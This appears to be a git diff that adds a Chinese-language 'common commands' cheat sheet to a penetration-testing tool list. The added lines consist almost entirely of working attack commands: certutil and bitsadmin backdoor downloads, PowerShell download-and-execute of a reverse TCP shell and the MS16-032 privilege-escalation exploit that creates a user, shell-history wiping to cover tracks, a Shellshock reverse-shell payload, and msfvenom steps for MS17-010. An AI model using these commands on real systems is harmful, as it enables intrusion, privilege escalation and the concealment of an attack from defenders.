@@ -37,5 +37,51 @@ wget     win版wget
 
 get.7z  get64.7z  mimikatz无交互版 直接shell下运行 get.7z    (不是压缩文件)
 
+### 常用命令
 
+1、开web
+
+python2 -m SimpleHTTPServer python3 -m http.server
+
+2、download backdoor
+
+certutil.exe -urlcache -split -f http://xxxx/g.jpg
+
+bitsadmin /rawreturn /transfer getfile http://xxxx/g.jpgc:p.7z
+
+
+3、tty
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+
+4、powershell
+
+root@kali:/tmp# wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+
+root@kali:/tmp# wget https://gist.githubusercontent.com/intrd/6dda33f61dca560e6996d01c62203374/raw/babf9a6afd23bb17a89bb3415099459db7bd25cf/ms16_032_intrd_mod.ps1
+
+powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile('http://10.1.x.x:8000/Invoke-PowerShellTcp.ps1','Invoke-PowerShellTcp.ps1')
+
+powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile('http://10.1.x.x:8000/ms16_032_intrd_mod.ps1','ms16_032_intrd_mod.ps1')
+
+
+IEX (New-Object Net.WebClient).DownloadString('http://10.1.x.x:8000/ms16_032_intrd_mod.ps1');Invoke-MS16-032 "-NoProfile -ExecutionPolicy Bypass -Command net user a xxxx /ad"
+
+
+5、不记录his
+
+unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
+
+6、破壳漏洞
+
+curl --user-agent '() { ignored;};/bin/bash -i >& /dev/tcp/xxx/3389 0>&1' http://xxx/cgi-bin/admin.cgi
+
+7、ms17010
+
+https://www.exploit-db.com/exploits/42315
+
+msfvenom -p windows/shell/reverse_tcp lhost=xxx lport=3389 -f exe-service > f.exe
+
+smb_send_file(smbConn, '/opt/17010/f.exe', 'C', '/f.exe') service_exec(conn, r'c:\\f.exe')
 
